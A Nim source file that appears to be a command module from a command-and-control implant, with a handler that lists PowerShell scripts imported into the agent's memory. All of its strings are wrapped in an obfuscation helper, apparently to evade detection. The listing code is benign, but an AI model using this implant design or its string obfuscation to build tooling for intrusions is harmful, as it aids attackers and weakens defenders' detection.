import json
import ../utils/strenc

when defined(windows):
  import ../global_data

proc powershellList*(taskId: string, params: JsonNode): JsonNode =
  ## List all imported PowerShell scripts with their names and sizes
  when not defined(windows):
    return %*{
      obf("task_id"): taskId,
      obf("completed"): true,
      obf("status"): "error",
      obf("user_output"): obf("powershell_list is only supported on Windows")
    }
  else:
    try:
      let scripts = getImportedPsScriptInfo()

      if scripts.len == 0:
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): obf("success"),
          obf("user_output"): obf("[*] No PowerShell scripts currently imported.\n[*] Use powershell_import to import a .ps1 script.")
        }

      var output = obf("[*] Imported PowerShell scripts (") & $scripts.len & obf("):\n")
      output.add(obf("    ") & obf("Name") & obf("                                     ") & obf("Size\n"))
      output.add(obf("    ") & obf("----") & obf("                                     ") & obf("----\n"))

      for script in scripts:
        let sizeStr = if script.size < 1024:
          $script.size & obf(" B")
        elif script.size < 1048576:
          $(script.size div 1024) & obf(" KB")
        else:
          $(script.size div 1048576) & obf(" MB")

        # Pad name to 40 chars for alignment
        var paddedName = script.name
        while paddedName.len < 40:
          paddedName.add(' ')

        output.add(obf("    ") & paddedName & sizeStr & "\n")

      output.add(obf("\n[*] Use 'scripts' parameter in powershell/powerpick to selectively load scripts."))

      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): obf("success"),
        obf("user_output"): output
      }

    except Exception as e:
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): "error",
        obf("user_output"): obf("Error listing PowerShell scripts: ") & e.msg
      }
